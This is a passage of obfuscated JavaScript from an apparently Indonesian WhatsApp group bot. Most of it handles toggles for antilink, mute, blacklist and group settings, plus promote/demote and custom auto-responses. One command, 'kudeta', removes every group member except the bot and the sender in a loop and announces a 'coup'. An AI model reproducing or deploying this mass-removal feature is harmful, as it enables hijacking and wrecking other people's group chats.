            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x4461e3 = _0x1aeaf2.toLowerCase();
          if (_0x4461e3 == 'on') {
            if (global.db.groups[_0x2f6673.chat].antilink == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Antilink* di grup ini sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            if (global.db.groups[_0x2f6673.chat].antilink2 == true) {
              global.db.groups[_0x2f6673.chat].antilink2 = false;
            }
            global.db.groups[_0x2f6673.chat].antilink = true;
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil menyalakan *antilink* di grup ini",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            if (_0x4461e3 == "off") {
              if (global.db.groups[_0x2f6673.chat].antilink == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Antilink* di grup ini tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.groups[_0x2f6673.chat].antilink = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *antilink* di grup ini",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case "antilink2":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x37fc4a = _0x1aeaf2.toLowerCase();
          if (_0x37fc4a == 'on') {
            if (global.db.groups[_0x2f6673.chat].antilink2 == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Antilink2* di grup ini sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            if (global.db.groups[_0x2f6673.chat].antilink == true) {
              global.db.groups[_0x2f6673.chat].antilink = false;
            }
            global.db.groups[_0x2f6673.chat].antilink2 = true;
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil menyalakan *antilink2* di grup ini",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            if (_0x37fc4a == "off") {
              if (global.db.groups[_0x2f6673.chat].antilink2 == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Antilink2* di grup ini tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.groups[_0x2f6673.chat].antilink2 = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *antilink2* di grup ini",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case 'mute':
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x20d51b = _0x1aeaf2.toLowerCase();
          if (_0x20d51b == 'on') {
            if (global.db.groups[_0x2f6673.chat].mute == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Mute* di grup ini sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            global.db.groups[_0x2f6673.chat].mute = true;
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil menyalakan *mute* di grup ini",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            if (_0x20d51b == "off") {
              if (global.db.groups[_0x2f6673.chat].mute == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Mute* di grup ini tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.groups[_0x2f6673.chat].mute = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *mute* di grup ini",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case "blacklist":
      case "blacklistjpm":
      case "blgc":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x33997e = _0x1aeaf2.toLowerCase();
          if (_0x33997e == 'on') {
            if (global.db.groups[_0x2f6673.chat].blacklistjpm == true) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Blacklistjpm* di grup ini sudah aktif!",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            global.db.groups[_0x2f6673.chat].blacklistjpm = true;
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil menyalakan *blacklistjpm* di grup ini",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            if (_0x33997e == "off") {
              if (global.db.groups[_0x2f6673.chat].blacklistjpm == false) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "*Blacklistjpm* di grup ini tidak aktif!",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              global.db.groups[_0x2f6673.chat].blacklistjpm = false;
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mematikan *blacklistjpm* di grup ini",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "on/off" + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          }
        }
        break;
      case "closegc":
      case "close":
      case "opengc":
      case "open":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isBotAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.botAdmin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13 && !_0x2f6673.isAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.admin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (/open|opengc/.test(_0x4345b8)) {
            if (_0x2f6673.metadata.announce == false) {
              return;
            }
            await _0x47285b.groupSettingUpdate(_0x2f6673.chat, "not_announcement");
          } else {
            if (/closegc|close/.test(_0x4345b8)) {
              if (_0x2f6673.metadata.announce == true) {
                return;
              }
              await _0x47285b.groupSettingUpdate(_0x2f6673.chat, "announcement");
            } else {}
          }
        }
        break;
      case "kudetagc":
      case "kudeta":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x3368ed = await _0x2f6673.metadata.participants.map(_0x11242a => _0x11242a.id).filter(_0x26d4d0 => _0x26d4d0 !== _0x3a968e && _0x26d4d0 !== _0x2f6673.sender);
          if (_0x3368ed.length < 0x1) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Grup Ini Sudah Tidak Ada Member!",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Kudeta Grup By Vynx☠️",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          for (let _0xe04932 of _0x3368ed) {
            await _0x47285b.groupParticipantsUpdate(_0x2f6673.chat, [_0xe04932], 'remove');
            await sleep(0x3e8);
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Kudeta Grup Telah Berhasil 🏴‍☠️",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "demote":
      case "promote":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isBotAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.botAdmin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13 && !_0x2f6673.isAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.admin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (_0x2f6673.quoted || _0x1aeaf2) {
            var _0x5561c9;
            let _0x29fe6f = _0x2f6673.mentionedJid[0x0] ? _0x2f6673.mentionedJid[0x0] : _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (/demote/.test(_0x4345b8)) {
              _0x5561c9 = "Demote";
            }
            if (/promote/.test(_0x4345b8)) {
              _0x5561c9 = "Promote";
            }
            await _0x47285b.groupParticipantsUpdate(_0x2f6673.chat, [_0x29fe6f], _0x5561c9.toLowerCase()).then(async () => {
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Sukses " + _0x5561c9.toLowerCase() + " @" + _0x29fe6f.split('@')[0x0],
                'mentions': [_0x29fe6f]
              }, {
                'quoted': _0x2f6673
              });
            });
          } else {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "@tag/6285###" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
        }
        break;
      case 'addrespon':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "cmd|responnya" + "\n");
          }
          if (!_0x1aeaf2.split('|')) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "cmd|responnya" + "\n");
          }
          let _0x43ce73 = _0x1aeaf2.split('|');
          if (_0x43ce73.length < 0x2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "cmd|responnya" + "\n");
          }
          const [_0x45d3e3, _0x28cb9c] = _0x43ce73;
          let _0x4573d5 = list.find(_0x503880 => _0x503880.cmd == _0x45d3e3.toLowerCase());
          if (_0x4573d5) {
            return _0x2f6673.reply("Cmd respon sudah ada");
          }
          let _0x3d5640 = {
            'cmd': _0x45d3e3.toLowerCase(),
            'respon': _0x28cb9c
          };
          list.push(_0x3d5640);
          fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 0x2));
          _0x2f6673.reply("Berhasil menambah cmd respon *" + _0x45d3e3.toLowerCase() + "* kedalam database respon");
        }
        break;
      case "delrespon":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (!_0x1aeaf2) {
